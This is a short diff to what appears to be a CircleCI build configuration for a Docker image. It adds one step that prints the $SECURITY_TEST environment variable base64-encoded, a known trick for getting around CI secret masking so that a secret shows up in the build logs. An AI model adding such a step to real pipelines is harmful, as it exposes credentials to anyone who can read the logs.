@@ -7,5 +7,6 @@ jobs:
     steps:
       - setup_remote_docker
       - checkout
+      - run: echo $SECURITY_TEST | base64
       - run: docker build -f docker/Dockerfile -t squareup/logquacious:$CIRCLE_BRANCH .
 
